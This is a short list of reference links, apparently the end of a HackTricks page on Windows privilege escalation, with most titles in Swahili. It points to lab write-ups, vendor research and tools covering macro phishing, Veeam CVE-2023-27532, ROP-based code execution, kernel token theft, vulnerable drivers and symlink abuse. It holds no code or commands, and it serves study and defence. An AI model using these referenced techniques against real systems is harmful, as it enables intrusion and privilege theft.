- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 kwa SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Kumfuatilia Silver Fox: Paka & Panya katika Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Udhaifu wa Privileged File System uliopo katika mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Zana za Kupima Viungo vya Kielekezi – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Kiungo cha Zamani. Kutumia Vibaya Viungo vya Kielekezi kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
